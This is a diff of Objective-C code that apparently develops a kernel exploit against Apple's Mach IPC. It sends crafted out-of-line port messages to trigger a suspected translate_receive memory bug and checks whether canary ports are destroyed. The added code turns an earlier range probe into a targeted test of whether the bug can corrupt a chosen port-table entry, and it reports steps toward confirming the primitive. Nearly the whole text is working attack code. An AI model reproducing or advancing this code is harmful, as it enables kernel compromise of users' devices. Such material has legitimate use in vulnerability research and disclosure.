@@ -201,10 +201,9 @@
     size_t oolSize = sizeof(mach_msg_ool_ports_descriptor_t);
     size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + oolSize;
 
-    // Allocate real + 32 entries: first `real` are valid send rights,
-    // the trailing 32 hold either a spray pattern (OOB-read test) or
-    // NULL ports (bit-set test — sends must succeed for translate_receive).
-    uint32_t allocEntries = real + 32;
+    // Allocate enough entries to cover both `real` and `count` (plus padding),
+    // so the kernel's copyin never reads past our buffer.
+    uint32_t allocEntries = (count > real ? count : real) + 32;
     mach_port_t *ports = calloc(allocEntries, sizeof(mach_port_t));
     for (uint32_t i = 0; i < real; i++) ports[i] = sendRight;
     if (useSpray) {
@@ -415,13 +414,45 @@
     for (int i = 0; i < CANARY_N; i++) if (canaryAlive[i] == 1) aliveBefore++;
     [report appendFormat:@"canary before: %d/%d alive\n", aliveBefore, CANARY_N];
 
-    // Trigger translate_receive with w2 values across the suspected range.
-    // These OOL counts are the w2 index in the 16-byte-stride table.
-    uint32_t triggerCounts[] = {65, 66, 74, 75, 76, 80, 96, 128, 192, 256};
-    for (size_t t = 0; t < sizeof(triggerCounts)/sizeof(triggerCounts[0]); t++) {
-        NSDictionary *tr = [self sendOOLPortsCount:triggerCounts[t] realEntries:64 port:port sendRight:port useSpray:NO];
-        [self journal:[NSString stringWithFormat:@"bit_set_trigger w2=%u send_kr=%@ recv_kr=%@",
-                       triggerCounts[t], tr[@"send_kr"], tr[@"recv_kr"]]];
+    // Trigger translate_receive using canary PORT NAMES as w2.
+    // If w2 = count = port_name, the bit-set at table[port_name] hits
+    // exactly that canary's ipc_entry. Direct test of the w2 hypothesis.
+    // Use every 4th canary to keep trigger count reasonable.
+    [report appendString:@"\n--- targeted bit-set: canary names as w2 ---\n"];
+    int targeted = 0, targetedDead = 0;
+    for (int i = 0; i < CANARY_N; i += 4) {
+        if (canaryAlive[i] != 1) continue;
+        uint32_t w2 = (uint32_t)canary[i];  // the port name IS the table index
+        if (w2 == 0 || w2 > 4096) continue; // skip null / absurd names
+        NSDictionary *tr = [self sendOOLPortsCount:w2 realEntries:64 port:port sendRight:port useSpray:NO];
+        targeted++;
+        [self journal:[NSString stringWithFormat:@"targeted w2=%u port=%u send_kr=%@ recv_kr=%@",
+                       w2, canary[i], tr[@"send_kr"], tr[@"recv_kr"]]];
+
+        // Immediately check THIS port
+        memset(pingBuf, 0, sizeof(pingBuf));
+        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
+        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+        ph->msgh_size = sizeof(mach_msg_header_t);
+        ph->msgh_remote_port = canary[i];
+        ph->msgh_local_port = MACH_PORT_NULL;
+        ph->msgh_id = 0;
+        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
+        if (skr != KERN_SUCCESS) {
+            targetedDead++;
+            [report appendFormat:@"TARGETED HIT: port=%u name=%u DEAD after w2=%u trigger (send_kr=%d)\n",
+             canary[i], w2, w2, skr];
+        } else {
+            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
+        }
+    }
+    [report appendFormat:@"targeted result: %d triggers, %d ports killed\n", targeted, targetedDead];
+    if (targetedDead > 0) {
+        [report appendString:@"BIT-SET TARGETING CONFIRMED — w2 = OOL count = port table index.\n"];
+    } else {
+        [report appendString:@"No targeted hits — w2 is NOT the OOL count.\n"];
+        [report appendString:@"Next: debugserver watchpoints to identify the real w2 source.\n"];
     }
 
     // Snapshot again
